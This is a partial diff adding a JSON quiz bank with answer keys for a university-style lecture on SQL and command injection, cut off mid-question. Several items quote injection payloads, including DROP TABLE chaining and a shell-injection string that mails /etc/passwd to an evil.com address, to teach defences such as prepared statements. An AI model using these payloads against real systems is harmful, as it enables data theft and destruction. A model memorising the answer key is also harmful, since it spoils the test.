@@ -1,0 +1,604 @@
+{
+  "lectureId": "lecture-16-sql-injection",
+  "lectureTitle": "SQL Injection & Command Injection",
+  "lectureNumber": 16,
+  "topics": [
+    "Web service architecture — client/server/database",
+    "SQL basics — SELECT/WHERE",
+    "SQL basics — INSERT/UPDATE/DELETE",
+    "SQL basics — CREATE/DROP",
+    "SQL syntax characters — comments, semicolons",
+    "ACID properties",
+    "Declarative vs imperative",
+    "String manipulation as the SQLi root cause",
+    "SQLi via OR TRUE",
+    "SQLi via DROP TABLE chaining",
+    "SQLi error-based detection",
+    "Blind SQL injection",
+    "sqlmap and tooling implications",
+    "Defense — input sanitization (escape/disallow)",
+    "Defense — prepared statements (?) and parser-side fix",
+    "Limitations of prepared statements — driver/API trust",
+    "Command injection via system()",
+    "Defense — safe APIs (execv, subprocess.run, exec.Command)",
+    "Untrusted input as parsed language — generalization",
+    "CWE-89 ranking"
+  ],
+  "questions": [
+    {
+      "id": "L16-Q01",
+      "type": "DIAGRAM",
+      "difficulty": "Foundational",
+      "topic": "Web service architecture — client/server/database",
+      "stem": "In the standard 3-tier web service diagram, which protocol typically connects the web server to the database server?",
+      "choices": [
+        { "id": "A", "text": "HTTP" },
+        { "id": "B", "text": "SQL (over a database-specific wire protocol)" },
+        { "id": "C", "text": "TCP only, with no higher-level protocol" },
+        { "id": "D", "text": "DNS" }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "The lecture's slide labels the client↔web-server link as HTTP and the web-server↔database-server link as 'SQL (usually).' SQL runs over a database-specific TCP-based wire protocol (MySQL protocol, PostgreSQL wire protocol, etc.) — but conceptually the messages flowing between the web server and the database are SQL queries and results.",
+      "distractorAnalysis": {
+        "A": "HTTP connects the client to the web server, not the web server to the DB.",
+        "C": "TCP is the transport, but SQL is the protocol layered on top.",
+        "D": "DNS is name resolution, unrelated to query/response."
+      },
+      "trapCategories": ["diagram-read", "architecture"],
+      "diagramRef": "lecture-16-web-architecture",
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q02",
+      "type": "MECHANISM",
+      "difficulty": "Foundational",
+      "topic": "Declarative vs imperative",
+      "stem": "Why is SQL described as a declarative language in contrast to imperative languages like C?",
+      "choices": [
+        { "id": "A", "text": "SQL specifies what result the programmer wants and lets the engine choose how to compute it; C specifies the exact step-by-step procedure." },
+        { "id": "B", "text": "SQL is faster than C." },
+        { "id": "C", "text": "SQL is interpreted, C is compiled." },
+        { "id": "D", "text": "SQL has no functions." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "Declarative languages describe the desired result; the engine plans execution. Imperative languages prescribe each step. `SELECT name FROM users WHERE age > 21` says what to fetch — the database optimizer decides whether to do an index lookup, full scan, etc. C requires the programmer to write the loop and the comparison.",
+      "distractorAnalysis": {
+        "B": "Speed isn't the distinction.",
+        "C": "Both are typically compiled to query plans / machine code.",
+        "D": "SQL has stored procedures, UDFs, etc."
+      },
+      "trapCategories": ["definition-test"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q03",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "String manipulation as the SQLi root cause",
+      "stem": "What is the fundamental design flaw that makes `query := fmt.Sprintf(\"SELECT name, price FROM items WHERE name = '%s'\", itemName)` vulnerable to SQL injection?",
+      "choices": [
+        { "id": "A", "text": "The query uses single quotes instead of double quotes." },
+        { "id": "B", "text": "Untrusted input (`itemName`) is concatenated into the SQL source text *before* the SQL parser runs, so any SQL syntax in the input is parsed as code rather than treated as data." },
+        { "id": "C", "text": "`fmt.Sprintf` is a deprecated function." },
+        { "id": "D", "text": "The query selects too many columns." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "The mistake is mixing untrusted data into program source before the parser. Once the string is built, the parser cannot tell which characters were the developer's intent and which came from the user. A user who supplies `'; DROP TABLE items--` is now contributing tokens to the parse tree. The fix is structural separation: parse the SQL with placeholders first, then bind data afterward.",
+      "distractorAnalysis": {
+        "A": "Quote style is irrelevant to the underlying problem.",
+        "C": "fmt.Sprintf isn't deprecated.",
+        "D": "Query shape is irrelevant."
+      },
+      "trapCategories": ["mechanism-test", "data-vs-code-separation"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q04",
+      "type": "GAME_WALK",
+      "difficulty": "Core",
+      "topic": "SQLi via OR TRUE",
+      "stem": "For the URL `https://vulnerable.com/get-items?item=' OR '1' = '1`, the resulting query is `SELECT item, price FROM items WHERE name = '' OR '1' = '1'`. Why does this return every row?",
+      "choices": [
+        { "id": "A", "text": "The query has no WHERE clause." },
+        { "id": "B", "text": "`name = ''` is generally false, but `OR '1' = '1'` is universally true. By boolean algebra, `false OR true = true`, so the WHERE filter passes for every row." },
+        { "id": "C", "text": "The injection bypasses the database engine and reads the raw table file." },
+        { "id": "D", "text": "`OR` causes SQL to ignore the entire WHERE clause." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "The injected condition is a tautology. WHERE evaluates per row; `name = ''` may or may not be true depending on the row, but `'1' = '1'` is always true, and the overall OR is always true. So the filter accepts every row, dumping the entire table to the attacker.",
+      "distractorAnalysis": {
+        "A": "There is a WHERE clause; it's just been logically neutralized.",
+        "C": "SQLi runs through the database engine like any query.",
+        "D": "OR is a normal boolean op, not a clause-disabler."
+      },
+      "trapCategories": ["mechanism-test", "tautology-injection"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q05",
+      "type": "GAME_WALK",
+      "difficulty": "Advanced",
+      "topic": "SQLi via DROP TABLE chaining",
+      "stem": "For the input `'; DROP TABLE items --`, the resulting query becomes `SELECT item, price FROM items WHERE name = ''; DROP TABLE items --'`. Walk through what each part of the payload achieves.",
+      "choices": [
+        { "id": "A", "text": "`'` closes the original quoted string; `;` ends the SELECT statement; `DROP TABLE items` is a separate destructive statement; `--` comments out the trailing `'` so the line parses cleanly." },
+        { "id": "B", "text": "`'` is a SQL keyword that means 'execute next.' `DROP TABLE` is the only meaningful part; the rest is padding." },
+        { "id": "C", "text": "The single quote escapes the next character, allowing `DROP` to be interpreted as data, not code." },
+        { "id": "D", "text": "The payload only works because the application is using PostgreSQL." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "Each character has a precise role. `'` closes the string literal in the WHERE clause. `;` terminates the SELECT, allowing a second statement. `DROP TABLE items` is the second statement, enabled because the database supports multi-statement queries. `--` introduces a SQL line comment, neutralizing the trailing `'` that the developer's template was going to add. Without each piece, the injection breaks: forget the `;` and you have invalid syntax; forget the `--` and the unmatched quote breaks parsing.",
+      "distractorAnalysis": {
+        "B": "`'` is a string-literal delimiter, not a keyword.",
+        "C": "The single quote *closes* the string, not escapes the next char.",
+        "D": "Statement chaining works in many DB systems; not PG-specific."
+      },
+      "trapCategories": ["payload-construction", "statement-chaining"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q06",
+      "type": "APPLICATION",
+      "difficulty": "Core",
+      "topic": "SQLi error-based detection",
+      "stem": "An attacker submits `?item='` and the server responds with HTTP 500 Internal Server Error. What does this most likely indicate to the attacker?",
+      "choices": [
+        { "id": "A", "text": "The server is offline." },
+        { "id": "B", "text": "The server is using prepared statements correctly." },
+        { "id": "C", "text": "The single quote broke the SQL syntax — the application is concatenating user input into a SQL string without sanitization or prepared statements, indicating a SQLi vulnerability that can be probed further." },
+        { "id": "D", "text": "The server is rate-limiting." }
+      ],
+      "correctAnswer": "C",
+      "mechanisticExplanation": "A bare quote injected into a vulnerable string-concatenation produces unbalanced quotes in the constructed SQL, which the database refuses to parse, returning an error. The web server propagates this as 500. From the attacker's perspective, this is a strong signal: SQLi is plausible. They can then escalate to OR-TRUE injection, UNION-based extraction, or blind techniques.",
+      "distractorAnalysis": {
+        "A": "Offline servers don't return 500; they return connection errors.",
+        "B": "Prepared statements would not produce an error here — the quote would be safely bound as data.",
+        "D": "Rate-limiting typically returns 429, not 500."
+      },
+      "trapCategories": ["mechanism-test", "error-as-oracle"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q07",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "Blind SQL injection",
+      "stem": "What makes a SQL injection attack 'blind,' and why is it still exploitable?",
+      "choices": [
+        { "id": "A", "text": "Blind SQLi means the attacker is not authenticated — only logged-in users can do regular SQLi." },
+        { "id": "B", "text": "Blind SQLi means the application returns no SQL output to the attacker — only a true/false signal (e.g., login succeeded or failed). Attackers extract data one bit at a time using boolean conditions, or escalate via timing side channels (e.g., `WHERE ... AND SLEEP(5)`); automated tools handle this efficiently." },
+        { "id": "C", "text": "Blind SQLi means the SQL server has no logging." },
+        { "id": "D", "text": "Blind SQLi cannot extract data; it can only delete rows." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Blind SQLi describes the feedback constraint: the attacker can't see query output directly. Instead, they craft injections whose payload causes a behavior the attacker can observe — different login result, different page load, different response time. Each probe yields one bit (true/false). Tools like sqlmap automate the bit-extraction so what was once tedious is now mostly a wait.",
+      "distractorAnalysis": {
+        "A": "Authentication is unrelated.",
+        "C": "Server logging is unrelated.",
+        "D": "Blind SQLi can extract data, just slowly."
+      },
+      "trapCategories": ["definition-test", "side-channel"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q08",
+      "type": "SYNTHESIS",
+      "difficulty": "Advanced",
+      "topic": "sqlmap and tooling implications",
+      "stem": "The lecture's takeaway from sqlmap is: 'Harder is harder only until someone makes a tool to automate the attack.' How should this principle inform a defender's threat model?",
+      "choices": [
+        { "id": "A", "text": "Defenders should rely on attacks being annoying enough to deter casual attackers." },
+        { "id": "B", "text": "Defenders must assume that the cost of any technically possible attack will eventually approach zero through tooling — so the security argument 'this is too hard to exploit in practice' is only temporarily valid. Mitigations should be evaluated on whether they make the attack *impossible*, not merely inconvenient." },
+        { "id": "C", "text": "Defenders should attack themselves with sqlmap once a year." },
+        { "id": "D", "text": "Defenders should avoid using SQL." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Tooling collapses skill barriers. A blind-SQLi exploit that took an expert hours becomes a one-line invocation for any user once the technique is automated. Defenders should evaluate mitigations against capabilities (does this prevent the attack class?), not against effort (how annoying is this for an attacker?). Prepared statements are the right answer because they eliminate the attack class structurally.",
+      "distractorAnalysis": {
+        "A": "Inverts the principle.",
+        "C": "Pen-testing is good practice but not the lecture's point.",
+        "D": "Avoiding SQL doesn't address the underlying data-vs-code mixing problem."
+      },
+      "trapCategories": ["synthesis", "threat-model-evolution"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q09",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "Defense — input sanitization (escape/disallow)",
+      "stem": "Why is escape-based input sanitization (`itemName = sqlEscape(itemName)`) considered a fragile defense?",
+      "choices": [
+        { "id": "A", "text": "Escape functions are slow." },
+        { "id": "B", "text": "Building an escaper that handles every edge case (multi-byte encodings, comment markers, statement separators, dialect-specific syntax) is hard; one missed case bypasses the entire defense. The escape approach is also dialect-coupled — an escaper written for MySQL may not work for PostgreSQL." },
+        { "id": "C", "text": "Escape functions delete data." },
+        { "id": "D", "text": "The SQL standard forbids escaping." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Escape-based defenses live or die by completeness. A correct escaper has to know every SQL dialect quirk: how the engine treats `\\`, multi-byte character boundaries, alternative comment syntaxes (`--`, `#`, `/* */`), Unicode normalization, etc. Historical SQLi bypasses repeatedly exploit the gap between what an escaper covers and what the parser actually accepts. Prepared statements eliminate this whole problem class.",
+      "distractorAnalysis": {
+        "A": "Speed isn't the issue.",
+        "C": "Escape functions don't delete data.",
+        "D": "Escaping is permitted; SQL even has standard escape syntax."
+      },
+      "trapCategories": ["mechanism-test", "completeness-fragility"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q10",
+      "type": "MECHANISM",
+      "difficulty": "Advanced",
+      "topic": "Defense — prepared statements (?) and parser-side fix",
+      "stem": "Why are prepared statements (queries with `?` placeholders, with data bound separately) considered structurally immune to SQL injection in a way that escaping is not?",
+      "choices": [
+        { "id": "A", "text": "Because the SQL is encrypted before transmission." },
+        { "id": "B", "text": "Because the parser sees the query template *with placeholder tokens already in place* and finishes parsing into a syntax tree before any user data is supplied. Once parsed, the placeholders are typed slots; user data is bound as values — there is no parsing pass that ever sees the user's bytes as SQL syntax." },
+        { "id": "C", "text": "Because prepared statements automatically escape special characters." },
+        { "id": "D", "text": "Because prepared statements only allow SELECT queries." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Prepared statements separate parsing from data binding. The query is parsed once; placeholders become typed parameter slots in the AST. When the data arrives later, it goes into those typed slots — never through the parser. The user's bytes therefore can never become SQL syntax, regardless of what they contain. This is the same principle as `printf(\"%s\", buf)` for format strings.",
+      "distractorAnalysis": {
+        "A": "Encryption isn't the mechanism.",
+        "C": "Auto-escaping is what string-concatenation-with-helpers does — fundamentally fragile. Prepared statements bypass parsing entirely.",
+        "D": "Prepared statements work for any DML/DDL the engine supports."
+      },
+      "trapCategories": ["mechanism-test", "parse-then-bind"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q11",
+      "type": "DISTRACTOR_TRAP",
+      "difficulty": "Trap",
+      "topic": "Limitations of prepared statements — driver/API trust",
+      "stem": "An engineer claims, 'My code uses `db.QueryRow(\"SELECT ... ?\", input)`, so SQL injection is impossible.' What's the most accurate caveat?",
+      "choices": [
+        { "id": "A", "text": "Prepared statements are not part of the SQL standard. The driver translates them into the database's native protocol, and a buggy driver could (in principle) still concatenate strings. In practice this is rare for mainstream databases and drivers, but the security guarantee is API-level, not standard-level — so 'consider human factors' for driver selection." },
+        { "id": "B", "text": "Prepared statements only work on Tuesdays." },
+        { "id": "C", "text": "Prepared statements are slower and therefore unsafe for production." },
+        { "id": "D", "text": "Prepared statements expose the database password." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "The lecture's nuance: prepared statements are not in the SQL standard. Drivers implement them by translating the placeholder query into the engine's native wire protocol — for MySQL, this is the `COM_STMT_PREPARE` protocol; for PostgreSQL, the extended query protocol; etc. A correct driver does this safely. A buggy driver could in principle do client-side string substitution and reintroduce injection. Mainstream drivers are battle-tested, so this is mostly a theoretical concern, but it's the principled caveat.",
+      "distractorAnalysis": {
+        "B": "Fabricated.",
+        "C": "Prepared statements are often *faster* due to plan caching.",
+        "D": "Unrelated."
+      },
+      "trapCategories": ["caveat-test", "non-standard-feature"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q12",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "Command injection via system()",
+      "stem": "In `snprintf(cmd, sizeof cmd, \"grep '%s' phonebook.txt\", regex); system(cmd);`, why is the input `'; mail mallory@evil.com < /etc/passwd; touch '` dangerous?",
+      "choices": [
+        { "id": "A", "text": "The `system` function spawns a shell, which interprets `;` as a statement separator and `<` as input redirection. The crafted input closes the original quoted argument, runs `mail` to exfiltrate `/etc/passwd`, and uses `touch` with empty quotes to syntactically complete the original command — turning grep's parameter into multiple shell commands." },
+        { "id": "B", "text": "`system` does not work on Linux." },
+        { "id": "C", "text": "`grep` is a deprecated tool." },
+        { "id": "D", "text": "`mallory@evil.com` is not a valid email address." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "Same pattern as SQLi but in shell metalanguage: untrusted data is concatenated into source code (a shell command line) which is then parsed by an interpreter (the shell). Shell metacharacters like `;`, `|`, `&`, `<`, `>`, `$()` allow the attacker to break out of the intended argument and execute arbitrary commands with the program's privileges.",
+      "distractorAnalysis": {
+        "B": "`system` works on Linux, macOS, and Windows.",
+        "C": "grep is fine; the issue is the shell wrapping.",
+        "D": "Email validity isn't the point."
+      },
+      "trapCategories": ["mechanism-test", "shell-metacharacters"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q13",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "Defense — safe APIs (execv, subprocess.run, exec.Command)",
+      "stem": "Why is `execv(\"/usr/bin/grep\", argv)` safer than `system(\"grep \" + user_input)` for the same task?",
+      "choices": [
+        { "id": "A", "text": "`execv` directly executes the named program with `argv` as a list of distinct arguments — there is no shell, and therefore no metacharacter parsing. Even if `argv[1]` contains `;` or `|` or `$()`, those are just bytes in an argument string to grep, not commands." },
+        { "id": "B", "text": "`execv` automatically validates that the user is authenticated." },
+        { "id": "C", "text": "`execv` runs the program in a sandbox that limits filesystem access." },
+        { "id": "D", "text": "`execv` is faster and therefore safer." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "The shell is the parser that gives `system` its injection surface. `execv` skips the shell — it directly creates a process running the named binary with the given argument list. No tokenization, no metacharacter expansion, no command chaining. Whatever the user supplied is passed as a literal string to the target program. Same principle as prepared statements: separate code from data structurally.",
+      "distractorAnalysis": {
+        "B": "execv has no auth check.",
+        "C": "execv has no built-in sandboxing.",
+        "D": "Speed isn't the safety property."
+      },
+      "trapCategories": ["mechanism-test", "shell-vs-execv"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q14",
+      "type": "NOT_PROVIDE",
+      "difficulty": "Core",
+      "topic": "Defense — safe APIs (execv, subprocess.run, exec.Command)",
+      "stem": "Which of the following is NOT a safe-API recommendation made by the lecture?",
+      "choices": [
+        { "id": "A", "text": "Use `execv` instead of `system` in C." },
+        { "id": "B", "text": "Use `subprocess.run` instead of `os.system` in Python." },
+        { "id": "C", "text": "Use `exec.Command` in Go." },
+        { "id": "D", "text": "Use `eval(user_input)` instead of `exec(user_input)` in Python." }
+      ],
+      "correctAnswer": "D",
+      "mechanisticExplanation": "`eval` is at least as dangerous as `exec` — both interpret untrusted input as Python code. The lecture explicitly recommends `subprocess.run` (safe) over `os.system` (unsafe), `execv` over `system` in C, and notes that Go's `exec.Command` is safe. There is no recommendation involving `eval`.",
+      "distractorAnalysis": {
+        "A": "Lecture recommendation.",
+        "B": "Lecture recommendation.",
+        "C": "Lecture recommendation — Go only has the safe version."
+      },
+      "trapCategories": ["not-provide", "fabricated-recommendation"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q15",
+      "type": "SYNTHESIS",
+      "difficulty": "Advanced",
+      "topic": "Untrusted input as parsed language — generalization",
+      "stem": "SQL injection, command injection, format string vulnerabilities, and XSS share a single underlying pattern. What is it, and what is the structural defense?",
+      "choices": [
+        { "id": "A", "text": "All four involve untrusted data being incorporated into source code that is later parsed by an interpreter (SQL parser, shell, printf, browser HTML/JS parser). The structural defense is to never let untrusted input become parsed code — separate code from data using prepared statements (SQL), exec-style argv APIs (shell), fixed format strings (printf), and proper escaping or templating with auto-escaping engines (HTML)." },
+        { "id": "B", "text": "All four involve buffer overflows in C." },
+        { "id": "C", "text": "All four are mitigated by stronger passwords." },
+        { "id": "D", "text": "All four exploit network weaknesses." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "The pattern is 'untrusted input becomes parsed code in some downstream interpreter.' Different interpreters mean different attack surfaces, but the same root cause — and the same fix shape: keep code and data structurally separate at every interpreter boundary.",
+      "distractorAnalysis": {
+        "B": "Memory safety is a different bug class.",
+        "C": "Passwords don't address this.",
+        "D": "All four are application-layer bugs, not network-layer."
+      },
+      "trapCategories": ["synthesis", "data-vs-code-separation"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q16",
+      "type": "MECHANISM",
+      "difficulty": "Foundational",
+      "topic": "SQL syntax characters — comments, semicolons",
+      "stem": "What does `--` mean in SQL, and why does this matter for injection payloads?",
+      "choices": [
+        { "id": "A", "text": "It is a logical NOT operator." },
+        { "id": "B", "text": "It introduces a single-line comment to end of line. In SQLi, attackers append `--` after their injection to comment out whatever syntactic remnants the developer's template would otherwise add (typically a closing quote or `AND` clause), making the injected query parse cleanly." },
+        { "id": "C", "text": "It decrements an integer." },
+        { "id": "D", "text": "It is reserved for stored procedures." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Standard SQL comment syntax: `--` to end of line. The lecture's `'; DROP TABLE items --` payload uses it precisely so the trailing `'` from the developer's `... = '%s'` template is commented out instead of producing a syntax error. Without `--`, the injection often dies at the parser.",
+      "distractorAnalysis": {
+        "A": "SQL's logical NOT is `NOT`.",
+        "C": "C-style decrement, not SQL.",
+        "D": "Comments work everywhere SQL is parsed."
+      },
+      "trapCategories": ["syntax-test", "payload-construction"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q17",
+      "type": "APPLICATION",
+      "difficulty": "Core",
+      "topic": "SQL basics — SELECT/WHERE",
+      "stem": "Given the `bots` table with columns id, name, likes, age, what does `SELECT name FROM bots WHERE age < 2 OR id = 1` return?",
+      "choices": [
+        { "id": "A", "text": "All names from the table." },
+        { "id": "B", "text": "Names where age < 2 AND id = 1." },
+        { "id": "C", "text": "Names of bots whose age is less than 2 (e.g., pintobot at 1.5) OR whose id is 1 (evanbot) — for a total of two distinct rows from the lecture's example." },
+        { "id": "D", "text": "Only names with id = 1." }
+      ],
+      "correctAnswer": "C",
+      "mechanisticExplanation": "WHERE applies the condition row-by-row. evanbot (id=1) matches via the id clause; pintobot (age=1.5) matches via the age clause; codabot matches neither. Result: 2 rows.",
+      "distractorAnalysis": {
+        "A": "Without WHERE this would return all; the WHERE filters.",
+        "B": "AND vs OR — the query uses OR.",
+        "D": "Only matches id=1, ignoring age clause — wrong combinator."
+      },
+      "trapCategories": ["sql-semantics", "or-vs-and"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q18",
+      "type": "DISTRACTOR_TRAP",
+      "difficulty": "Trap",
+      "topic": "Defense — input sanitization (escape/disallow)",
+      "stem": "An engineer says, 'I disallow single quotes in usernames, so SQLi is impossible.' What's the principled rebuttal?",
+      "choices": [
+        { "id": "A", "text": "Disallowing one character is a denylist; SQLi can use other vectors (numeric injection without quotes, comment-based bypass, alternative comment syntax, multi-byte encoding tricks). Denylisting characters is a treadmill — you'll always find another vector. Use prepared statements instead." },
+        { "id": "B", "text": "The engineer is correct — disallowing single quotes prevents all SQLi." },
+        { "id": "C", "text": "The engineer is correct only if the database is MySQL." },
+        { "id": "D", "text": "Disallowing characters affects performance." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "Single-quote denylisting addresses one vector. Numeric SQLi (`?id=1 OR 1=1`) doesn't need quotes. Comment markers (`--`, `#`, `/* */`) provide alternatives. Multi-byte encoding tricks have historically bypassed naive filters. Denylists are perpetually incomplete; allowlists are at least closed-set, but for SQL, prepared statements eliminate the entire problem.",
+      "distractorAnalysis": {
+        "B": "Absolutist; numeric injection alone refutes this.",
+        "C": "DB engine is irrelevant.",
+        "D": "Performance isn't the issue."
+      },
+      "trapCategories": ["denylist-trap", "absolutist-language"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q19",
+      "type": "MECHANISM",
+      "difficulty": "Core",
+      "topic": "ACID properties",
+      "stem": "Which of the following best summarizes what ACID guarantees mean for the *security* posture of a SQL database?",
+      "choices": [
+        { "id": "A", "text": "ACID prevents SQL injection." },
+        { "id": "B", "text": "ACID guarantees that the database never stores a partial operation, never returns an invalid state, and is robust against race conditions — these are correctness properties that prevent data-integrity bugs and TOCTOU races, but they do NOT prevent injection or authorization bypass." },
+        { "id": "C", "text": "ACID encrypts data at rest." },
+        { "id": "D", "text": "ACID provides no security benefit at all." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "ACID is about transaction correctness: atomicity (all-or-nothing), consistency (constraints preserved), isolation (no interleaving anomalies), durability (committed data survives crashes). These prevent a real class of bugs — partial transfers, race-condition double-spends, lost updates. But ACID has nothing to do with whether your query was constructed safely.",
+      "distractorAnalysis": {
+        "A": "ACID and SQLi are orthogonal.",
+        "C": "Encryption-at-rest is a separate feature.",
+        "D": "ACID has real security value for integrity bugs."
+      },
+      "trapCategories": ["definition-test", "scope-confusion"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q20",
+      "type": "GAME_WALK",
+      "difficulty": "Advanced",
+      "topic": "Defense — prepared statements (?) and parser-side fix",
+      "stem": "Trace what happens when `db.QueryRow(\"SELECT name FROM items WHERE name = ?\", \"'; DROP TABLE items--\")` executes against a SQL server.",
+      "choices": [
+        { "id": "A", "text": "The DROP TABLE fires because the input contains the destructive payload." },
+        { "id": "B", "text": "The driver sends the parsed query template and the parameter value over separate wire-protocol messages. The server has already finished parsing `SELECT name FROM items WHERE name = ?` into an AST. The parameter `'; DROP TABLE items--` arrives as a typed string value, bound into the placeholder slot — no parsing occurs on the parameter. The result is a SELECT for an item literally named `'; DROP TABLE items--` (which probably doesn't exist), and zero damage." },
+        { "id": "C", "text": "The driver returns an error because the input contains forbidden characters." },
+        { "id": "D", "text": "The driver escapes the input client-side, then concatenates it into the query." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Walk through wire-protocol semantics: PARSE phase delivers the template; the server returns a prepared-statement handle. EXECUTE phase delivers the parameter values, which the server places into typed parameter slots without parsing. The query runs as 'find an item literally named that long string'. The destructive bytes are inert because they never reached a parser.",
+      "distractorAnalysis": {
+        "A": "DROP would only fire if the bytes reached the parser; they don't.",
+        "C": "Drivers don't reject characters.",
+        "D": "Mainstream drivers don't do client-side string substitution; that would be the unsafe pattern."
+      },
+      "trapCategories": ["protocol-walkthrough", "parse-then-bind"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q21",
+      "type": "DIAGRAM",
+      "difficulty": "Foundational",
+      "topic": "CWE-89 ranking",
+      "stem": "On the 2020 CWE Top 25 slide highlighted in lecture 16, which CWE was emphasized to motivate the lecture, and what is its rank?",
+      "choices": [
+        { "id": "A", "text": "CWE-79 Cross-site Scripting at #1." },
+        { "id": "B", "text": "CWE-89 'Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)' at #6." },
+        { "id": "C", "text": "CWE-787 Out-of-bounds Write at #2." },
+        { "id": "D", "text": "CWE-200 Exposure of Sensitive Information at #7." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "Lecture 16 is on SQL injection, so the slide highlights CWE-89 in yellow at rank #6 (score 20.69). The other CWEs appear on the same list but are highlighted in their respective lectures.",
+      "distractorAnalysis": {
+        "A": "CWE-79 is highlighted in the XSS lecture.",
+        "C": "CWE-787 is highlighted in the memory-safety lecture (Lecture 15).",
+        "D": "Not the highlighted row."
+      },
+      "trapCategories": ["diagram-read", "cwe-ranking"],
+      "diagramRef": "lecture-16-cwe-top25",
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q22",
+      "type": "APPLICATION",
+      "difficulty": "Core",
+      "topic": "SQL basics — INSERT/UPDATE/DELETE",
+      "stem": "What is the difference in effect between `UPDATE bots SET age = 6` (no WHERE) and `UPDATE bots SET age = 6 WHERE name = 'willow'`?",
+      "choices": [
+        { "id": "A", "text": "There is no difference." },
+        { "id": "B", "text": "Without WHERE, UPDATE applies to every row in the table — every bot's age becomes 6. With WHERE, only the matching row(s) are updated. Forgetting WHERE on an UPDATE or DELETE is a classic catastrophic mistake — the SQL standard does not require WHERE." },
+        { "id": "C", "text": "Without WHERE, the UPDATE fails." },
+        { "id": "D", "text": "Without WHERE, only the first row is updated." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "WHERE filters which rows the action applies to. The default — no WHERE — means 'every row.' This is also why SQLi payloads on UPDATE/DELETE statements are particularly dangerous; an attacker who can inject a tautological condition can update or delete every row in the table.",
+      "distractorAnalysis": {
+        "A": "Massive difference.",
+        "C": "It succeeds, on every row.",
+        "D": "It updates all rows, not just the first."
+      },
+      "trapCategories": ["sql-semantics", "default-behavior"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q23",
+      "type": "MECHANISM",
+      "difficulty": "Foundational",
+      "topic": "SQL basics — CREATE/DROP",
+      "stem": "Why is `DROP TABLE` the canonical SQLi payload in classic demonstrations?",
+      "choices": [
+        { "id": "A", "text": "It is the only SQL statement that can run via injection." },
+        { "id": "B", "text": "It is maximally destructive and instantly visible — the entire table disappears, including all data, schema, and indexes — making the impact unambiguous in pedagogical examples (and in real successful attacks). The xkcd 'Bobby Tables' comic uses it for the same reason." },
+        { "id": "C", "text": "It is the only statement allowed in stored procedures." },
+        { "id": "D", "text": "It bypasses ACID guarantees." }
+      ],
+      "correctAnswer": "B",
+      "mechanisticExplanation": "DROP is the most dramatic statement — it destroys the entire table irreversibly. For demonstration purposes it makes the consequences impossible to miss. In real attacks, a sophisticated adversary usually prefers stealthier payloads (data exfiltration via UNION SELECT, persistent backdoors via INSERT, privilege escalation via UPDATE) since DROP alerts the target immediately.",
+      "distractorAnalysis": {
+        "A": "Any statement can be injected.",
+        "C": "DROP works in regular queries too.",
+        "D": "DROP is itself an ACID transaction."
+      },
+      "trapCategories": ["pedagogy", "impact-test"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q24",
+      "type": "SYNTHESIS",
+      "difficulty": "Advanced",
+      "topic": "Defense — safe APIs (execv, subprocess.run, exec.Command)",
+      "stem": "Go's `exec.Command(name, args...)` API has no unsafe shell-execution variant in the standard library. What design lesson does this represent, and what trade-off does it impose?",
+      "choices": [
